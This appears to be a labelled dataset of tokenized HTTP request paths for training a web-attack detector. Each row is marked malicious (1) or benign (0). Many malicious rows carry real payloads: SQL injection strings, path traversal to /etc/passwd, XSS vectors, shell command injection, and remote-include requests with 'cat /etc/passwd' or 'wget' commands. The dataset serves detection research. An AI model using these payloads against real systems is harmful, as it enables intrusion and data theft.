request	label
"/ main . php ? stuff =  "" ping \ xa0-w \ xa010000 \ xa0-n \ xa01 \ xa01 . 2 . 3 . 4 & rem \ xa0 "	1
/ javascript / document . cc 	1
/ panel / flash / portal / diag / index . jsp 	0
"/ string / strings / parameters = -3737 %  ""  ""  union all select 4452 , 4452 , 4452 # "	1
/ jcsa5stock / 	0
/ 000022828 / 	0
"/ string / strings / parameters = -8093 ""  ""  )  )  as oboi where 1476 = 1476 union all select 1476 , 1476 , 1476 , 1476 # "	1
/ string / strings / parameters = -6186 '  in boolean mode )  union all select 2990 , 2990 , 2990 # 	1
/ string / modo = insertar & precio = 8683 & b1 = pasar + por + caja 	0
/ string / strings / parameters = 22446221s 	0
/ javascript / gwt . xsl 	0
/ string / strings / parameters = -5780 or make_set ( 3464 = 4518 , 4518 )  --  icit 	1
/ javascript / cgi-home 	0
/ string / strings / parameters = ti20 	0
/ string / strings / parameters = |   [  9 -ne  $  ( echo sqhkcg  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  & 	1
/ examples / jsp / sessions / shared / help . php ? page =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
"/ string / strings / parameters = ""  )  , null , null , null )  waitfor delay  ' 0 : 0 : 20 '   -- "	1
/ string / modo = registro & login = satkamp & password = 6asc5oso & nombre = nlida & apellidos =  +  & email = hurst @ guejos . iq & dni = 91086664v & direccion = callejon + cinco + minutos ,  + 31 + 6 ? d & ciudad = sieteiglesias + de + tormes & cp = 40355 & provincia = vizcaya & ntc = 5805357208824154 & b1 = registrar 	1
/ 101655 / 	0
/ aa394387 / 	0
/ string / modo = registro & login = mareah & password = malh5jo & nombre = eulalio & apellidos = tal + gorriz & email = trissenaar @ tetdevelocidad . uk & dni = 18684547z & direccion = c /  + hermanos + senise + colmenero ,  + 153 ,  + 3-d & ciudad = forua & cp = 08470 & provincia = valencia & ntc = 9004541540453342 & b1 = registrar 	0
/ 20051110-10 / 	0
/ cash_stacks / 	0
/ string / strings / parameters = '  |   [  7 -ne  $  ( echo rhgvtl  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \ 	1
/ javascript / devs . sh 	0
/ string / strings / parameters = sisante 	0
/ cgi-bin / secure . php ? cfgprogdir =  / etc / passwd \ x00 	1
/ top . php ? stuff =  \ x0auname \ x09 > q56166211 \ x09 # 	1
/ examples / jsp / cal / resetpw . php ? email =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ 000110723 / 	0
/ string / modo = entrar & login = waring & pwd = 445ug4 & remember = on & b1 = entrar 	0
/ stomping / 	0
"/ string / id = 2paros ""  style =  "" background : url ( javascript : alert (  ' paros '  )  ) "	1
/ string / strings / parameters = 1 %  '  )  )  or 8421 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  and  (  (  '  %  '  =  ' 	1
/ string / strings / parameters = josefa 	0
/ cacti / index . php ? action = login & languages [ nessus ]  = syscp_1211 . nasl & language = nessus & langs [ nessus ]  [ 0 ]  [ file ]  =  / etc / passwd 	1
/ sthurston / 	0
/ 021006 / 	0
/ cgi-bin / openview5 . exe ? target = main & action =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / winnt / win . ini 	1
/ string / strings / parameters = 9678 	0
/ string / modo = insertar & precio = 7159 & b1 = pasar + por + caja 	0
"/ string / modo = registro & login = lachine & password = contraamura & nombre = nicasia & apellidos = coyoma + abia & email = padovani @ thequeenworm . mp & dni = 78419891b & direccion = avenida + castilla-la + mancha + 187 ,  + 3-d & ciudad = sagrada ,  + la & cp = 09318 & provincia = a + corua <  !  --  # exec + cmd =  "" ls +  /  ""  --  >  & ntc = 4808153993761167 & b1 = registrar "	1
/ string / strings / parameters = 12005174w 	0
/ main . php ? stuff =  \ x0duname \ x09 > q73354592 \ x09 # 	1
/ resources / loginexec . php 	0
/ 043726 / 	0
/ 3gpconvert_information / 	0
/ mp3odwas / 	0
/ cong106 / 	0
/ store . php ? crn = 42 '  & action = show & show_products_mode = cat_click 	1
/ string / strings / parameters = prado de la guzpea 	0
/ string / id = 3 & nombre = queso + manchego & precio = 85 & cantidad = 59 & b1 = aadir + al + carrito 	0
/ string / strings / parameters = 1 '  +  ( select  ' supo '  where 8691 = 8691 ; select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 )  +  ' 	1
/ socom ii afterhours map / 	0
/ adam_maanit / 	0
"/ string / strings / parameters = 1 ""  ""  )  and  ( select  *  from  ( select ( sleep ( 5 )  )  ) gcrr )  # "	1
/ fnwhrxyd . cfm ?  < script > cross_site_scripting . nasl <  / script > 	1
"/ string / modo = registro & login = corissa & password = cipresino & nombre = cenobio & apellidos = la + ringa + chinchilla & email = plate @ pecher . mx & dni = 16052504e & direccion = torres + quevedo ,  + 143 + 10 ? b & ciudad = casas + de + juan + nez & cp = 31480 & provincia =  < script > alert (  "" paros ""  )  ;  <  / script >  & ntc = 1974630082144363 & b1 = registrar "	1
/ examples / servlets / servlet / docs / index . php ? lang =  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ string / modo = registro & login = micgael5 & password = dogal & nombre = adelmo & apellidos =  +  & email = cagney @ hiperespaa . et & dni = 99942317a & direccion = carrer + sant + fruitos + 1 ,  +  & ciudad = riells + i + viabrea & cp = 29410 & provincia = mlaga & ntc = 4452881808901719 & b1 = registrar 	1
/ string / strings / parameters = $  { shell_exec ( print (  ` echo nslpbw `  .  ` echo  $  (  ( 95 + 54 )  )  `  .  ` echo nslpbw `  .  ` echo nslpbw `  )  ;  \  \ nslpbw 	1
"/ string / modo = entrar & login = jamin & pwd = paros ""  + style =  "" background : url ( javascript : alert (  ' paros '  )  )  & id = 2 & remember = off & b1 = entrar "	1
/ eudora_7 / 	0
/ string / strings / parameters = -7868 '  in boolean mode )  union all select 5117 , 5117 , 5117 , 5117 , 5117 , 5117 , 5117 , 5117 , 5117 # 	1
/ string / strings / parameters = patchit 	0
/ javascript / me . tpl 	0
/ divorce-lawyers / 	0
/ examples / jsp / jsp2 / el / way-board / way-board . cgi ? db =  / etc / passwd \ x00 	1
/ javascript / catalog . phtml 	0
/ examples / jsp / checkbox / mapserv . exe ? map = mapserver_detect . nasl . map 	1
/ category93 / 	0
/ string / strings / parameters = 1 '  )  )  )  and  ( select 9067 from ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 9067 = 9067 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from information_schema . character_sets group by x ) a )  and  (  (  (  ' dsok '  =  ' dsok 	1
/ string / strings / parameters = 23593437z 	0
/ examples / jsp / sessions / auktion . cgi ? menue =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ string / strings / parameters = c /  andres piquer 175 ,  2 ? b 	0
/ string / strings / parameters = labranto 	0
"/ help . php ? q =  ""  ; del q25549328  # "	1
/ string / strings / parameters = ambrosia 	0
/ gepi / gestion / savebackup . php ? filename = http :  /  / 192 . 168 . 202 . 96 : 8080 / 4dckqcc0acprbz ?  & cmd = cat / etc / passwd 	1
/ string / modo = insertar & precio = 1599 & b1 = confirmar + 	1
/ 1500301 / 	0
/ year-1996 / 	0
/ string / strings / parameters = < img / src =  ` 	1
/ javascript / properties . exe 	1
/ string / strings / parameters = perpiny romero 	0
/ javascript / 100 . sfish 	0
/ string / strings / parameters = 1 ; select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 #  ljph 	1
/ string / strings / parameters = qunola 	0
/ encryption primer / 	0
/ password revealing tools windows / 	0
/ string / strings / parameters = levitin 	0
/ string / strings / parameters = mankowsk 	0
/ main . php ? logout =  '  & rm \ x09q65543975 \ x09 # 	1
"/ string / modo = registro & login = houdini & password = cabilea & nombre = yulisa & apellidos =  <  !  --  # exec + cmd =  "" ls +  /  ""  --  >  & email = hee4 @ ropadegolf . name & dni = 77786356b & direccion = c /  + guatemala ,  + s / n ,  + 6g & ciudad = jvea / xbia & cp = 39790 & provincia = zaragoza & ntc = 2661491792098457 & b1 = registrar "	1
/ string / strings / parameters = 1 '  |  |  ( select  ' scwx '  where 6591 = 6591 and 3824 = benchmark ( 5000000 , md5 ( 0x76555642 )  )  )  |  |  ' 	1
"/ a0imiuf1 . mscgi ?  < meta http-equiv = set-cookie content =  "" testxqrn = 4654 ""  > "	1
/ string / strings / parameters = c /  antonio oliver s / n ,  4 ? h 	0
"/  ?  < script > document . cookie =  "" testylik = 3403 ;  ""  <  / script > "	1
"/ string / strings / parameters = '  ""  >  >  < marquee >  < img src = x onerror = confirm ( 1 )  >  <  / marquee > "	1
/ javascript / document . tmp 	1
/ javascript / 1996 . zip 	0
/ jackets / 	0
/ ivc2 / backup / ivc1 / html / index . htm 	0
/ javascript / wml . bat 	0
"/ de3v2dd9 . pl ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / modo = registro & login = nada & password = bizantina & nombre = segundo & apellidos = de + la + cerda + gassol & email = gonska @ estaestuweb . com . af & dni = 36746323m & direccion = rio + esgueva + 57 + 1 ? g & ciudad = urdua-ordua & cp = 43364 & provincia = albacete & ntc = 1222164542017972 & b1 = registrar 	0
/ string / strings / parameters = 9561142447521888 	0
/ string / strings / parameters = chinchintor 	0
/ razorback records / 	0
/ javascript / inetpub . shtml 	0
/ string / modo = registro & login = mariaele & password = clerofobia & nombre = royce & apellidos = cornetero + siruela & email = jager @ tresbrujas . hr & dni = 41502558r & direccion = calle + pico + mampodre + 106 ,  +  & ciudad = alhama + de + aragn & cp = 01439 & provincia = barcelona & ntc = 	1
/ ascotch / 	0
/ 16110336 / 	0
/ top . php ? stuff =  '  & del q76213281  # 	1
"/ string / strings / parameters = 1 ""  ""  where 1920 = 1920 and 8635 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  -- "	1
"/ oie504mr . php3 ?  < meta http-equiv = set-cookie content =  "" testtpby = 7052 ""  > "	1
/ string / strings / parameters = < div style = width : 1px ; filter : glow onfilterchange = javascript : alert ( 1 )  > x 	1
/ government_security / 	0
/ 16tech / 	0
/ a-blog / navigation / latestnews . php ? navigation_start = xxpathxx ? 	1
/ string / strings / parameters = 1 '  )  ; call regexp_substring ( repeat ( right ( char ( 3702 )  , 0 )  , 500000000 )  , null )  and  (  ' xcnj '  =  ' xcnj 	1
"/ 0qhcnefz . htm ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ phpmyadmin / cgi-bin 	0
"/ en-us / esmozg5d . cfc ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ 189153 / 	0
/ string / strings / parameters = | echo mibcvm $  (  ( 5 + 17 )  )  $  ( echo mibcvm ) mibcvm ' 	1
"/ string / strings / parameters = >  <  / script >  ""  >  '  >  < script > alert ( string . fromcharcode ( 88 , 83 , 83 )  )  <  / script > "	1
/ manager / sendcard . php ? view = 1 & id =  ' sendcard_sql . nasl 	1
/ manager / netauth . cgi ? cmd = show & page =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ string / strings / parameters = 15885803w 	0
/ define-diltiazem / 	0
"/ string / strings / parameters = < xml id =  "" xss ""  >  < i >  < b >  & lt ; img src =  "" javas <  !  --   --  > cript : alert (  ' xss '  )  ""  & gt ;  <  / b >  <  / i >  <  / xml >  < span datasrc =  ""  # xss ""  datafld =  "" b ""  dataformatas =  "" html ""  >  <  / span >  <  / c >  <  / x >  <  / xml >  < span datasrc =  # i datafld = c dataformatas = html >  <  / span > "	1
"/ p043snfr . html ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ 1369277940 / 	0
/ truck_82x32 / 	0
/ string / strings / parameters = ;  str =  $  ( echo pmpvhc )  ;  str1 =  $  {  # str }  ;  if  [  3 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  ' 	1
/ string / modo = registro & login = daren9 & password = r09pe574 & nombre = gamaliel & apellidos = gioiosa + isasi & email = caesar-vitez2 @ apelton . sy & dni = 25292190x & direccion = isabel + la + catolica ,  + 5 +  & ciudad = robledo ,  + el & cp = 29150 & provincia = len & ntc = 8590730598040371 & b1 = registrar 	0
/ string / strings / parameters = 5855 	0
/ main . php ? logout =  ' del \ x09q24187781 \ x09 # 	1
/ string / strings / parameters = hall 	0
"/ main . php ? stuff =  ""  \ x0arm q55324883  # "	1
/ 116666321421091479 / 	0
/ 6n7aacgg . cfm ?  < script > cross_site_scripting . nasl <  / script > 	1
/ anstoss 2007_information / 	0
/ string / strings / parameters = 6olpeador 	0
"/ awstats / awstats . pl ? migrate =  | echo ;  / bin / echo -en  ""  \ 0367 \ 0322 \ 0041 \ 03201 \ 0311qqj \ 0042j \ 0007pq \ 0211 \ 0343 ""   >  >   / tmp / qcywjpzuja0 ; echo | awstats902207 . txt "	1
/ string / strings / parameters = noye 	0
/ groovymother / 	0
"/ string / strings / parameters = 1 ""  ""  )  )  )  ; begin dbms_lock . sleep ( 5 )  ;  end and  (  (  (  ""  "" zpii ""  ""  like  ""  "" zpii "	1
/ string / modo = entrar & login = livia & pwd = d5s81l05r & remember = bob @  < script > alert ( paros )  <  / script >  . parosproxy . org & b1 = entrar 	1
/ main . php ? frm_daynight = day & frm_passwd =  & frm_referer = http :  /  / 192 . 168 . 26 . 202 / main . php ? logout = 1 & frm_user = q47292667 & scr_height =  & scr_width = 	1
/ string / strings / parameters = cauthen3 	0
/ string / strings / parameters = heki 	0
"/ help . php ? q =  ""  | sleep 10  # "	1
/ cacti / dcforum . cgi ? az = list & forum =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ string / strings / parameters = echo hbfeem $  (  ( 46 + 2 )  )  $  ( echo hbfeem ) hbfeem ' 	1
/ string / modo = insertar & precio = 2829 & b1 = pasar + por + caja 	0
"/ string / strings / parameters = -2901 ""  ""  or elt ( 9866 = 9099 , 9099 )  and  ""  "" asib ""  ""  like  ""  "" asib "	1
/ 20050121-3 / 	0
/ 06-oct / 	0
/ bannerwindowsecurity / 	0
"/ i7prbs22 . cfc ?  < meta http-equiv = set-cookie content =  "" testjnre = 7328 ""  > "	1
/ electrifried / 	0
/ path_script / createurl . php ? formurl = http :  /  / 192 . 168 . 202 . 118 : 8080 / 2aibfaczmac8 ? 	1
/ string / strings / parameters = berrocal de huebra 	0
/ string / strings / parameters = 1 '  ; select  ( case when  ( 1412 = 5313 )  then 1412 else 1412 *  ( select 1412 from mysql . db )  end )  # 	1
/ v7997687 / 	0
/ string / id = 2 & nombre = vino + rioja & precio = 85 /  & cantidad = 28 & b1 = aadir + al + carrito 	1
/ shipitinc / 	0
/ string / strings / parameters = -7084 )  where 2260 = 2260 or elt ( 1032 = 1032 , 3623 )  -- 	1
"/ string / strings / parameters = -8919 ""  ""  or 4747 = dbms_utility . sqlid_to_sqlhash (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  )  and  ""  "" nstr ""  ""  =  ""  "" nstr "	1
/ string / modo = registro & login = sharnoff & password = patrstica & nombre = eli & apellidos = cabrer + gascon & email = sergyl @ intercambiodeenlaces . gh & dni = 76518142v & direccion = c /  + alcalde + conangla + s / n ,  +  & ciudad = pinar ,  + el & cp = 37793 & provincia = zaragoza & ntc = 4336085166451274 & b1 = registrar 	0
/ xoops232b / htdocs / xoops_lib / modules / protector / onupdate . php ? mydirname = a (  )  {  } system (  '  /  .  / tmp / utxzfzsgat0 +  >  +  / dev / null +  &  '  )  ;  function v 	1
/ 25rider / 	0
"/ string / strings / parameters = ""  |  | echo $ ifsoolsup $  (  ( 60 + 80 )  )  $  ( echo $ ifsoolsup ) oolsup | "	1
"/ string / str =  $  ( echo dplqys )   str1 =  $  {  # str }   if  [  7 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  "" "	1
/ javascript / phpmyadmin . phtml 	0
"/ string / strings / parameters = exp /  *  < a style =  ' no \ xss : noxss (  ""  *  /  /  *  ""  )  ; xss : ex /  * xss *  /  /  *  /  *  / pression ( alert (  "" xss ""  )  )  '  > "	1
/ 127599 / 	0
/ hdtv003 / 	0
/ drhcprxk . iso8859-8 	0
/ javascript / showpost . lst 	0
/ ar tonelico_information / 	0
"/ en-us / account / search / results . stm ? indexname =  >  ""  >  < script > foo <  / script >  & style = fancy & spage = 60 & query = folder name "	1
/ scripts / ajax . php ? rs = __exp__getfeedcontent & rsargs [  ]  = -99 union select 1247962577 , 2 , 176146104 , 4 , 5 , 6 , 7 , 8 , 9 , 0 , 1 , 2 , 3  -- 	1
/ digidesignhd / 	0
/ string / strings / parameters = 3491970910096618 	0
/ string / strings / parameters = 34473 	0
/ 2170477 / 	0
/ string / strings / parameters = portillo 	0
/ javascript / not 	0
/ string / strings / parameters = -2896 '  )  )  as wisk where 1030 = 1030 union all select 1030 , 1030 , 1030 , 1030 # 	1
/ fcgi-bin / vssetcookie . exe 	1
/ string / strings / parameters = diafragmar 	0
/ string / strings / parameters = san jorge ,  188 	0
/ string / strings / parameters = sati1f4ctori4 	0
/ main . php ? stuff = rm ; q96335299 & rem ; 	1
/ dokeos / claroline / resourcelinker / resourcelinker . inc . php ? clarolinerepositorysys = xxpathxx ?  & cmd = wget xxpathxx 	1
/ string / strings / parameters = 1 '  )  )  )  and elt ( 2506 = 2383 , 2383 )  and  (  (  (  ' bjrj '  =  ' bjrj 	1
/ string / strings / parameters = 1 and elt ( 1210 = 1210 , sleep ( 5 )  )  --  ommf 	1
/ string / strings / parameters = '  or 1 = 1 	1
/ string / strings / parameters = solar 	0
/ 123366 / 	0
/ string / modo = entrar & login = sherm & pwd = polli7o & remember = on & b1 = entrar 	0
/ string / strings / parameters = aborr-ascarse 	0
/ emeade / 	0
/ string / strings / parameters = 1 and 8514 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  --  loao 	1
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo uggxtg )   &  &  str1 =  $  {  # str }   &  &   [  1 -eq  $  { str1 }   ]   &  &  sleep 1  ' 	1
/ mimg-6tssuu / 	0
/ string / modo = registro & login = moel & password = lab2a8o4i0 & nombre = evangelino & apellidos = marcano + giner & email = jochim @ ajuntamentdebarcelona2-0 . qa & dni = 68733218h & direccion = calle + orotava + 31 +  & ciudad = valdelinares & cp = 43439 & provincia = burgos & ntc = 8288603955421514 & b1 = registrar 	0
/ maildigest / 	0
/ pages_h / 	0
/ string / strings / parameters = carrer felix cucurull ,  167 3-a 	0
/ art_resources / 	0
"/ mv8wxfy9 . jspa ?  < script > document . cookie =  "" testrhbc = 8184 ;  ""  <  / script > "	1
/ article177-48 / 	0
/ outlookextract / 	0
/ en-us / account / search =  < script > alert (  ' xss '  )  <  / script > 	1
/ snapshot_019 / 	0
"/ help . php ? q =  "" rm \ x0cq49751234 & rem \ x0c "	1
/ string / strings / parameters = 4ode5ista 	0
/ string / strings / parameters = 1 '  )  and 6969 =  ( select 6969 from pg_sleep ( 5 )  )  and  (  ' ifvz '  like  ' ifvz 	1
"/ r3le3om5 . html ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ sidebar_sitefeatures / 	0
"/ xlj7h65o . html ?  < meta http-equiv = set-cookie content =  "" testtbbe = 856 ""  > "	1
